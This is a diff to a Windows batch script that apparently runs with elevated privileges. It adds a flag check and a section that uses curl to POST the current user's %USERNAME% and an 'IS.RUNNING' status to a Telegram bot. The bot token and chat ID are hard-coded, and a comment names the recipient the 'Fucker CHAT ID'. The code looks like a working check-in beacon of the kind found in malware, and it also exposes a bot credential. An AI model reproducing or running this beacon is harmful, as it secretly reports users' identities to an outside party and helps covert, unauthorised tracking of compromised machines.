@@ -2,6 +2,8 @@
 @echo off
 
 
+set "CheckConnectSend=0"
+
 
 ::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
 
@@ -335,6 +337,17 @@ if %loopCount% lss 15 (
 
 
 
+:: Check the value of CheckConnectSend
+if "%CheckConnectSend%"=="0" (
+    goto SENDCHECK
+) else (
+    goto :EOF
+)
+
+
+
+:SENDCHECK
+
 :: SEND MSG
 
 :: Fucker CHAT ID : -1002163721260
@@ -344,20 +357,15 @@ if %loopCount% lss 15 (
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGE=%USERNAME%|TESTING……|"
+set "MESSAGE=%USERNAME%|IS.RUNNING……|"
 
-
-:: URL encode the message by replacing spaces with %20
-set "ENCODED_MESSAGE=%MESSAGE: =%%2"
 
 :: Send the message using curl
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
-     -d "text=%ENCODED_MESSAGE%"
+     -d "text=%MESSAGE%"
 
 echo Message sent to chat ID %CHAT_ID%
-
-
 
 
 
